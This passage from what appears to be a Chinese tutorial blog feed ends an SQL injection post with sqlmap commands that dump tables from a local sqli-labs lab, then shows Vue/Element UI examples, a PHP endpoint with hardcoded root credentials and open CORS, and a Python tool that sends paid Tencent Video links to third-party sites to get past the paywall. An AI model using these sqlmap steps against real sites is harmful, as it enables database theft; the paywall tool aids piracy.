class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch -D security --tables</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231923406.png" alt="image-20231223192315186"></p><p>查看security数据库下，users表下有那些字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch -D security -T users --columns</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231925582.png" alt="image-20231223192507153"></p><p>查看security数据库下，users表下的id，username两个字段有那些数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -u &quot;http://192.168.2.59:808/sqli/Less-1/?id=1&quot;  --batch -D security -T users -C &quot;id,username&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231927130.png" alt="image-20231223192749083"></p><p>下面的是将查询到的数据保存到本地的地址</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231928123.png" alt="image-20231223192836742"></p><p>以上是get请求传参的sqlmap的使用方式，以下是post请求的使用方式</p><p>1，使用工具截取post的请求数据，我这里使用的是Yakit</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231934478.png" alt="image-20231223193405078"></p><p>2，将请求数据保存为本地11.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231940279.png" alt="image-20231223193801014"></p><p>3，使用SQLmap破解数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py  -r 11.txt --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231940458.png" alt="image-20231223193958242"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;目录：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp; &lt;strong&gt;SQL注入的危害:&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp; &lt;strong&gt;MySQL数据库5.0上下的区别:&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp; &lt;s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十八，html引用Element2</title>
    <link href="http://example.com/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/"/>
    <id>http://example.com/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/</id>
    <published>2023-12-17T01:37:52.000Z</published>
    <updated>2023-12-17T02:41:23.342Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，html引用element2组件"><a href="#1，html引用element2组件" class="headerlink" title="1，html引用element2组件"></a>1，html引用element2组件</h4><p>element2组件的地址为： <a href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a></p><p>将index.css,vue.js,index.js三个文件下载到本地并引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;./element/index.css&quot;&gt;</span><br><span class="line">&lt;script src=&quot;./element/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;./element/index.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>下载地址分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://element.eleme.cn/#/zh-CN/component/installation</span><br><span class="line">https://unpkg.com/vue@2/dist/vue.js</span><br><span class="line">https://unpkg.com/element-ui/lib/index.js</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>中进行设置布局：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    new Vue(&#123;</span><br><span class="line">      el: &#x27;#app&#x27;,</span><br><span class="line">      data: function() &#123;</span><br><span class="line">        return &#123; visible: false &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>并且在<strong>body</strong>标签中引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;el-button @click=&quot;visible = true&quot;&gt;Button&lt;/el-button&gt;</span><br><span class="line">    &lt;el-dialog :visible.sync=&quot;visible&quot; title=&quot;Hello world&quot;&gt;</span><br><span class="line">      &lt;p&gt;Try Element&lt;/p&gt;</span><br><span class="line">    &lt;/el-dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>演示效果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171041725.png" alt="image-20231217104115234"></p><h4 id="2，方法进行数据绑定"><a href="#2，方法进行数据绑定" class="headerlink" title="2，方法进行数据绑定"></a>2，方法进行数据绑定</h4><p>（1）插值表达式：，将表达式的值在View中显示出来</p><p>（2）v-bind：将标签的属性绑定到指定的变量上。简写方式： :属性名&#x3D;’变量名’</p><p>在<strong>script</strong>中设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data: function () &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                visible: false,</span><br><span class="line">                text:&#x27;首页&#x27;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在<strong>body</strong>中引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&#123;&#123;text&#125;&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171004376.png" alt="image-20231217100420293"></p><p>实现点击引用不同的页面效果：</p><p>在<strong>body</strong>中设置点击执行方法和引用标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-menu-item @click=&quot;router&quot;&gt;用户列表&lt;/el-menu-item&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe :src=&quot;iframeSrc&quot; frameborder=&quot;false&quot;</span><br><span class="line">                        style=&quot;top:80px;left: 120px;width: 100%;height: 500px&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>中设置变量和执行的改变变量值的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iframeSrc: &#x27;&#x27;,</span><br><span class="line"> methods: &#123;</span><br><span class="line">                    router() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin.php&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    router2() &#123;</span><br><span class="line">                        this.iframeSrc = &quot;admin2.php&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>就可以实现点击不同的标签，会改变为不同引用页面的方法。</p><h4 id="3，axios进行数据通信"><a href="#3，axios进行数据通信" class="headerlink" title="3，axios进行数据通信"></a>3，axios进行数据通信</h4><p>先下载axios.min.js到本地并进行引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://unpkg.com/axios/dist/axios.min.js</span><br><span class="line">&lt;!-- 引入axios库 --&gt;</span><br><span class="line">  &lt;script src=&quot;./element/axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>写出执行的php页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);</span><br><span class="line">header(&#x27;content-type:text/html; charset= utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">$link = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;hysxm&quot;);</span><br><span class="line"></span><br><span class="line">$tableData = array();</span><br><span class="line">//从表中查询数据</span><br><span class="line">$select = &quot;SELECT * FROM users where isadm=0 &quot;;</span><br><span class="line">$result1 = $link-&gt;query($select);</span><br><span class="line">if ($result1-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">    // 输出数据</span><br><span class="line">    while ($row = $result1-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $tableData[] = $row;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$link-&gt;close();</span><br><span class="line"></span><br><span class="line">$requestPath = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: application/json&#x27;);</span><br><span class="line">echo json_encode($tableData); // 输出所有用户数据的JSON表示</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在table标签中引用tableData变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%; font-size:20px;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在<strong>script</strong>设置变量并和页面刷新前执行的方法，用axios发送请求获取返回数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tableData: [],</span><br><span class="line">get_data: function () &#123;</span><br><span class="line">          this.menu_name = &quot;用户列表&quot;;</span><br><span class="line">          axios.get(&#x27;http://127.0.0.1/user/quer_user.php&#x27;) // 执行注销链接的请求</span><br><span class="line">            .then(response =&gt; &#123;</span><br><span class="line">              this.tableData = response.data; // 将响应数据存储在Vue实例的数据中</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(error =&gt; &#123;</span><br><span class="line">              alert(&quot;获取数据失败！&quot;); // 在请求失败时显示提示信息</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        mounted() &#123;</span><br><span class="line">        this.get_data();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>页面效果:</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171028821.png" alt="image-20231217102828547"></p><h4 id="4-vite设置局域网访问"><a href="#4-vite设置局域网访问" class="headerlink" title="4,vite设置局域网访问"></a>4,vite设置局域网访问</h4><p>cmd进入项目的文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx vite --host 0.0.0.0</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171031585.png" alt="image-20231217103124483"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312171031098.png" alt="image-20231217103138604"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，html引用element2组件&quot;&gt;&lt;a href=&quot;#1，html引用element2组件&quot; class=&quot;headerlink&quot; title=&quot;1，html引用element2组件&quot;&gt;&lt;/a&gt;1，html引用element2组件&lt;/h4&gt;&lt;p&gt;elemen</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十七，python爬虫-VIP视频解析器</title>
    <link href="http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/"/>
    <id>http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/</id>
    <published>2023-12-11T13:48:34.000Z</published>
    <updated>2023-12-11T14:07:29.302Z</updated>
    
    <content type="html"><![CDATA[<p>​用python爬虫制作一个VIP视频解析器，通过拿到腾讯视频的VIP电影地址发送到解析网站，获取解析结果地址，自动打开浏览器访问，具体步骤如下：</p><h4 id="1，导入该程序所需要的python组件库"><a href="#1，导入该程序所需要的python组件库" class="headerlink" title="1，导入该程序所需要的python组件库"></a>1，导入该程序所需要的python组件库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from PIL import Image,ImageTk</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">import webbrowser</span><br></pre></td></tr></table></figure><h4 id="2，制作一个居中的窗口"><a href="#2，制作一个居中的窗口" class="headerlink" title="2，制作一个居中的窗口"></a>2，制作一个居中的窗口</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个窗口</span></span><br><span class="line">root=Tk()</span><br><span class="line"><span class="comment"># 窗口加标题</span></span><br><span class="line">root.title(<span class="string">&#x27;VIP视频解析器&#x27;</span>)</span><br><span class="line"><span class="comment"># 设置窗口大小</span></span><br><span class="line">root.geometry(<span class="string">&quot;500x470&quot;</span>)</span><br><span class="line"><span class="comment"># 获取屏幕的宽度和高度</span></span><br><span class="line">screen_width = root.winfo_screenwidth()</span><br><span class="line">screen_height = root.winfo_screenheight()</span><br><span class="line"><span class="comment"># 计算窗口在屏幕上的位置（居中）</span></span><br><span class="line">x_pos = <span class="built_in">int</span>((screen_width / <span class="number">2</span>) - (<span class="number">500</span> / <span class="number">2</span>))</span><br><span class="line">y_pos = <span class="built_in">int</span>((screen_height / <span class="number">2</span>) - (<span class="number">470</span> / <span class="number">2</span>))</span><br><span class="line"><span class="comment"># 使用geometry()函数设置窗口的位置和大小</span></span><br><span class="line">root.geometry(<span class="string">&quot;+&#123;&#125;+&#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_pos, y_pos))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一直打开窗口</span></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><h4 id="3-在该代码文件的同一文件夹下有一张名为fengmian-png的图片，用相对路径引用并放到窗口上"><a href="#3-在该代码文件的同一文件夹下有一张名为fengmian-png的图片，用相对路径引用并放到窗口上" class="headerlink" title="3,在该代码文件的同一文件夹下有一张名为fengmian.png的图片，用相对路径引用并放到窗口上"></a>3,在该代码文件的同一文件夹下有一张名为fengmian.png的图片，用相对路径引用并放到窗口上</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 窗口中加上一个图片</span></span><br><span class="line">image=Image.<span class="built_in">open</span>(<span class="string">&#x27;./fengmian.png&#x27;</span>)</span><br><span class="line"><span class="comment"># 转换为PhotoImage对象，避免图像丢失问题  </span></span><br><span class="line">img = ImageTk.PhotoImage(image)  </span><br><span class="line"><span class="comment"># 创建一个Label，并设置图片  </span></span><br><span class="line">lab_img = Label(root, image=img)  </span><br><span class="line">lab_img.image = img  <span class="comment"># 避免图像丢失问题  </span></span><br><span class="line">lab_img.pack()</span><br></pre></td></tr></table></figure><h4 id="4-加上选择解析路径的标签"><a href="#4-加上选择解析路径的标签" class="headerlink" title="4,加上选择解析路径的标签"></a>4,加上选择解析路径的标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chooce_frm=LabelFrame(root)</span><br><span class="line">chooce_frm.pack(pady=10,fill=&#x27;both&#x27;)</span><br><span class="line">jiexi_lab=Label(chooce_frm, text=&#x27;选择路径：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)</span><br><span class="line"># 设置单选变量</span><br><span class="line">num_chooce=IntVar()</span><br><span class="line"># 设置默认选中路线1</span><br><span class="line">num_chooce.set(1)</span><br><span class="line"># 设置三个单选按钮</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;1号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=1).pack(side=&#x27;left&#x27;)</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;2号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=2).pack(side=&#x27;left&#x27;)</span><br><span class="line">Radiobutton(chooce_frm,text=&#x27;3号路线&#x27;,font=(&#x27;微软雅黑&#x27;,15),variable=num_chooce,value=3).pack(side=&#x27;left&#x27;)</span><br></pre></td></tr></table></figure><h4 id="5，加上输入要解析的视频的地址的标签"><a href="#5，加上输入要解析的视频的地址的标签" class="headerlink" title="5，加上输入要解析的视频的地址的标签"></a>5，加上输入要解析的视频的地址的标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url_frm=LabelFrame(root)</span><br><span class="line">url_frm.pack(pady=10,fill=&#x27;both&#x27;)</span><br><span class="line">bofang_lab=Label(url_frm, text=&#x27;播放地址：&#x27;,font=(&#x27;黑体&#x27;,15)).pack(side=&#x27;left&#x27;)</span><br><span class="line"># 设置输入变量</span><br><span class="line">input_var=StringVar()</span><br><span class="line">input_ent=Entry(url_frm,width=100,relief=&#x27;flat&#x27;,textvariable=input_var)</span><br><span class="line">input_ent.pack(side=&#x27;left&#x27;,fill=&#x27;both&#x27;)</span><br></pre></td></tr></table></figure><h4 id="6，设置解析按钮"><a href="#6，设置解析按钮" class="headerlink" title="6，设置解析按钮"></a>6，设置解析按钮</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">btn_jiexi=Button(root,command=parser,text=&#x27;解析视频&#x27;,bg=&#x27;#00BFFF&#x27;,fg=&#x27;#FFFFFF&#x27;,activebackground=&#x27;#00BFFF&#x27;,activeforeground=&#x27;#00BFFF&#x27;,font=(&#x27;微软雅黑&#x27;,15),relief=&#x27;flat&#x27;)</span><br><span class="line">btn_jiexi.pack(fill=&#x27;both&#x27;)</span><br></pre></td></tr></table></figure><h4 id="7，写出点击按钮所执行的方法"><a href="#7，写出点击按钮所执行的方法" class="headerlink" title="7，写出点击按钮所执行的方法"></a>7，写出点击按钮所执行的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 点击解析按钮，进行解析</span><br><span class="line">def parser():</span><br><span class="line">    num=num_chooce.get()</span><br><span class="line">    base_url=input_var.get()</span><br><span class="line">    if not base_url:</span><br><span class="line">        message=&#x27;视频播放地址不能为空，请重新输入！&#x27;</span><br><span class="line">        open_new_window(message)</span><br><span class="line">    else:</span><br><span class="line">        if num==1:</span><br><span class="line">            link=&#x27;https://www.8090g.cn/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        elif num==2:</span><br><span class="line">            link=&#x27;https://www.8090.la/8090/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        elif num==3:</span><br><span class="line">            link=&#x27;https://jx.xmflv.com/?url=&#x27;+base_url</span><br><span class="line">            jieixi(link)</span><br><span class="line">        else:</span><br><span class="line">            message=&#x27;路线选择错误，请重新选择路线！&#x27;</span><br><span class="line">            open_new_window(message)</span><br></pre></td></tr></table></figure><p>其中<a href="https://www.8090g.cn/?url=%E6%98%AF%E8%A7%A3%E6%9E%90%E5%9C%B0%E5%9D%80">https://www.8090g.cn/?url=是解析地址</a><br><a href="https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html%E6%98%AF%E8%A7%A3%E6%9E%90%E5%89%8D%E7%9A%84%E5%9C%B0%E5%9D%80">https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析前的地址</a><br><a href="https://www.8090g.cn/?url=https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html%E6%98%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E7%9A%84%E5%9C%B0%E5%9D%80">https://www.8090g.cn/?url=https://v.qq.com/x/cover/mzc00200wpwy6bn/k0047973rwp.html是解析后的地址</a></p><h4 id="8，写出在主窗口上弹出新窗口的方法"><a href="#8，写出在主窗口上弹出新窗口的方法" class="headerlink" title="8，写出在主窗口上弹出新窗口的方法"></a>8，写出在主窗口上弹出新窗口的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在主窗口上弹出新窗口</span><br><span class="line">def open_new_window(message):</span><br><span class="line">    new_window = Toplevel(root)</span><br><span class="line">    new_window.title(&quot;vip视频解析器&quot;)</span><br><span class="line">    new_window.geometry(&quot;350x100+650+400&quot;)</span><br><span class="line">    label = Label(new_window, text=message)</span><br><span class="line">    label.pack()</span><br></pre></td></tr></table></figure><h4 id="9，写出获取解析后的视频地址并打开的方法"><a href="#9，写出获取解析后的视频地址并打开的方法" class="headerlink" title="9，写出获取解析后的视频地址并打开的方法"></a>9，写出获取解析后的视频地址并打开的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 获取解析后的视频地址并打开</span><br><span class="line">def jieixi(link):</span><br><span class="line">    response=requests.get(link)</span><br><span class="line">    content=response.text</span><br><span class="line">    tree=etree.HTML(content)</span><br><span class="line">    url=tree.xpath(&#x27;//iframe[@id=&quot;WANG&quot;]/@src&#x27;)[0]</span><br><span class="line">    webbrowser.open(url)</span><br></pre></td></tr></table></figure><h4 id="10，运行效果："><a href="#10，运行效果：" class="headerlink" title="10，运行效果："></a>10，运行效果：</h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112159140.png" alt="image-20231211215957932"></p><p>VIP视频地址：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112200307.png" alt="image-20231211220053194"></p><p>复制地址栏中的地址，输入后点击解析视频</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112201923.png" alt="image-20231211220150649"></p><p>解析成功，自动打开浏览器观看</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112205198.png" alt="image-20231211220528128"></p><p>python爬虫-VIP视频解析器制作完成！</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		用python爬虫制作一个VIP视频解析器，通过拿到腾讯视频的VIP电影地址发送到解析网站，获取解析结果地址，自动打开浏览器访问，具体步骤如下：&lt;/p&gt;
&lt;h4 id=&quot;1，导入该程序所需要的python组件库&quot;&gt;&lt;a href=&quot;#1，导入该程序所需要的python</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十六，VUE的使用</title>
    <link href="http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-12-11T13:33:05.000Z</published>
    <updated>2023-12-11T13:43:23.768Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1，要使用vue前先下载node-js"><a href="#1，要使用vue前先下载node-js" class="headerlink" title="1，要使用vue前先下载node.js"></a>1，要使用vue前先下载node.js</h4><p>下载地址为：<a href="https://nodejs.org/en">https://nodejs.org/en</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v  </span><br><span class="line">检查是否已安装node.js</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112141387.png" alt="image-20231211205438106"></p><h4 id="2，创建vue项目"><a href="#2，创建vue项目" class="headerlink" title="2，创建vue项目"></a>2，创建vue项目</h4><p>cmd命令窗口进入一个放置vue项目的文件夹，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm create vue@latest</span><br></pre></td></tr></table></figure><p>若没有vue环境则会自动安装，然后定义项目的名字。接下来的就都一直按回车键确定就好了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112134407.png" alt="img"></p><p>底部会出现3行提示，跟着它敲然后回车就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd you_project_name//进入项目</span><br><span class="line">npm install//初始化项目</span><br><span class="line">npm run dev//运行服务</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112135020.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112135122.png" alt="img"></p><p>复制地址：<a href="http://localhost:5173/">http://localhost:5173/</a> 去浏览器打开，就可以跳转到vue的界面了</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112138536.png" alt="img"></p><p>表示项目创建成功！</p><h4 id="3-Vue3项目中引入ElementUI"><a href="#3-Vue3项目中引入ElementUI" class="headerlink" title="3.Vue3项目中引入ElementUI"></a>3.Vue3项目中引入ElementUI</h4><p>​ElementUI是一个强大的PC端UI组件框架，它不依赖于vue，但是却是当前和vue配合做项目开发的一个比较好的ui框架，其包含了布局（layout)，容器（container）等各类组件，基本上能满足日常网站的搭建开发。</p><p>​ElementUI组件地址：<a 